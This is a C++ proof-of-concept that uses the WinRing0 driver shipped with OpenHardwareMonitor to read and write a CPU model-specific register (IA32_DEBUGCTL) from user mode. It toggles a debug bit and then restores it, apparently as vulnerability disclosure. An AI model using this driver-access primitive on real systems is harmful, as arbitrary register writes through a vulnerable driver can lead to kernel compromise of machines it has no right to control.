#include <windows.h>
#include <iostream>

#include "openhardwaremonitor.h"

#define IA32_DEBUGCTL 0x1D9

int main( )
{
	printf( "\n\tOpenHardwareMonitor R/W Msr Vulnerability PoC\n\n" );
	printf( "[+] Setting Process Affinity Mask to 1 Core\n" );
	
	if ( !SetProcessAffinityMask( GetCurrentProcess( ), 1 << 1 ) )
	{
		printf( "[!] Error Setting Process Affinity Mask!\n" );

		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Opening Device Handle\n" );

	auto h_device = CreateFileA( "\\\\.\\WinRing0_1_2_0", GENERIC_READ | GENERIC_WRITE, NULL, nullptr,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
	if ( !h_device )
	{
		printf( "[!] Error Opening Device Handle, Probably the Driver isnt Loaded!\n" );
		
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	unsigned long long first_debugctl_msr_value;
	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &first_debugctl_msr_value ) )
	{
		printf( "[!] Error While Reading Msr!\n" );

		CloseHandle( h_device );

		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Setting LBR bit\n", first_debugctl_msr_value );

	if ( !ohm::write_msr( h_device, IA32_DEBUGCTL, first_debugctl_msr_value | 0b1 ) )
	{
		printf( "[!] Error While Writing Msr!\n" );

		CloseHandle( h_device );

		system( "pause>nul" );
		return 1;
	}
	
	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	unsigned long long second_debugctl_msr_value;
	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &second_debugctl_msr_value ) )
	{
		printf( "[!] Error While Reading Msr!\n" );

		CloseHandle( h_device );

		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Removing LBR bit\n", second_debugctl_msr_value );

	if ( !ohm::write_msr( h_device, IA32_DEBUGCTL, first_debugctl_msr_value ) )
	{
		printf( "[!] Error While Writing Msr!\n" );

		CloseHandle( h_device );

		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	unsigned long long third_debugctl_msr_value;
	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &third_debugctl_msr_value ) )
	{
		printf( "[!] Error While Reading Msr!\n" );

		CloseHandle( h_device );

		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n", third_debugctl_msr_value );

	CloseHandle( h_device );

	system( "pause>nul" );
	return 0;
}
